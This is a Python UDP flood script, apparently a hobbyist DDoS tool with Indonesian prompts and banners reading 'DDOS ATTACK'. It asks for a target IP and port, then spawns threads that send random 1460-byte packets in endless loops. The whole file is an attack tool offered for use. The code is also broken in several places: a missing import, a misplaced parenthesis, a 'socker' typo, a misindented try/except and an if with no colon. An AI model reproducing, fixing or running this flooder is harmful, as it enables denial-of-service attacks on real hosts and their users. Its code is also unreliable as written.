import signal
import random
import socket
import threading
import os,sys

print("""
░██████╗░██████╗░██╗░██████╗███████╗██╗░░░░░
██╔════╝░██╔══██╗██║██╔════╝╚════██║██║░░░░░
██║░░██╗░██████╔╝██║╚█████╗░░░███╔═╝██║░░░░░
██║░░╚██╗██╔══██╗██║░╚═══██╗██╔══╝░░██║░░░░░
╚██████╔╝██║░░██║██║██████╔╝███████╗███████╗
░╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚══════╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░""")
os.system("clear")
time.sleep(1)
print(" CREDIT : GRISZLYX ")
os.system("clear")
time.sleep(1)
print(" NOT ABUSE ")
os.system("clear")
time.sleep(1)
print (" JAN RENAME YA PANTECK ")
os.system("clear")
print(" TUNGGU 5 DETIK DULU MONYET ")
time.sleep(5)

print("""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝""")
os.system("clear")

ip = str(input("IP TARGET : "))
port = int(input("PORT TARGET : "))
choice = str(input("YAKIN KIRIM PAKETNYA? : "))
times = int(input("BANYAK PACKET : "))
threads = int(input("HARGA PACKET : "))

def ddos():
	data = random._urandom(1460)
	i = random.choice(("[PACKET]","[PACKET]","[PACKET]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"MENGIRIM PACKET KE JALAN %s DAN NOMOR RUMAH %s "%(ip,port))
		except:
			print("PACKET DARI GRISZLY TELAH BERHENTI!!")
			
def ddos2():
	data = random._urandom(1460)
	i = random.choice(("[PACKET]","[PACKET]","[PACKET]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socker.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
		print(i +"MENGIRIM PACKET KE JALAN %s DAN NOMOR RUMAH %s"%(ip,port))
	except:
		print("PACKET DARI GRISZLY TELAH BERHENTI!!")
		
for y in range(threads):
	if choice == 'y'
	th = threading.Thread(target = ddos)
	th.start()
	th = threading.Thread(target = ddos2)
	th.start()
				